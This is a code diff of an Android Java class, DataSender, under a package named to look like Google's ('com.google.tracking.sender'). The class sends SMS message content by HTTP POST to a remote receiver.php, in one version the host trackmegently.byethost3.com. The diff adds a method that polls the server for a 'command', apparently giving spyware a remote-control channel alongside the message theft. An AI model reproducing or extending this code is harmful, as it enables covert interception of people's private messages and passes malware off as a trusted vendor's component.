@@ -1,28 +1,35 @@
 package com.google.tracking.sender;
 
-import android.content.Context;
+import android.net.http.AndroidHttpClient;
 import android.os.Build;
 import android.util.Log;
-import android.widget.Toast;
 
-import java.io.*;
-import java.net.*;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.io.IOException;
+import java.net.HttpURLConnection;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.nio.charset.Charset;
 
 /**
  * Created by maxim.yanukovich on 06.01.2015.
  */
-public class DataSender {
-    //private static String urlString = "http://192.168.9.71:80/SVN/receiver.php";
-    private static String urlString = "http://trackmegently.byethost3.com/receiver.php";
+public class DataSender implements IDataSender{
+    private static final String TAG = "DataSender";
+    private static String urlString = "http://192.168.9.102:80/SVN/receiver.php";
+//    private static String urlString = "http://trackmegently.byethost3.com/receiver.php";
     private static String SMS = "sms";
+    private static String COMMAND = "command";
 
-    public DataSender(String msg, Context context) {
-        Log.d(this.getClass().toString(), urlString.toString());
+    public DataSender() {
+        Log.d(TAG, urlString.toString());
 
         disableConnectionReuseIfNecessary();
+    }
 
-        sendSMS(msg);
+    public void getNextAction() {
+        postHttp(COMMAND, "message");
     }
 
     public void sendSMS(String msg) {
@@ -37,23 +44,29 @@ public class DataSender {
             int postDataLength = postData.length;
 
             URL url = new URL(urlString);
-            HttpURLConnection httConn = (HttpURLConnection) url.openConnection();
-            httConn.setDoOutput(true);
-            httConn.setDoInput(true);
-            httConn.setInstanceFollowRedirects(false);
-            httConn.setRequestMethod("POST");
-            httConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-            httConn.setRequestProperty("charset", "utf-8");
-            httConn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
-            httConn.setUseCaches(false);
-            httConn.connect();
+            HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
+            httpConn.setDoOutput(true);
+            httpConn.setDoInput(true);
+            httpConn.setInstanceFollowRedirects(false);
+            httpConn.setRequestMethod("POST");
+            httpConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            httpConn.setRequestProperty("charset", "utf-8");
+            httpConn.setRequestProperty("Content-Length", Integer.toString(postDataLength));
+            httpConn.setUseCaches(false);
+            httpConn.connect();
             try {
-                DataOutputStream os = new DataOutputStream(httConn.getOutputStream());
+                DataOutputStream os = new DataOutputStream(httpConn.getOutputStream());
                 os.write(postData);
-                Log.d("getResponseCode", String.valueOf(httConn.getResponseCode()));
-//                wr.writeUTF(urlParameters);
+
+                Log.d(TAG, " getResponseCode:" + String.valueOf(httpConn.getResponseCode()));
+
+//                DataInputStream is = new DataInputStream(httpConn.getInputStream());
+
+
+//                Log.d(TAG, "input : " + is.readUTF());
+
             } catch (Exception ex) {
-                Log.d("Exception", ex.getMessage());
+                Log.d(TAG, "Exception : " + ex.getMessage());
             }
 
 
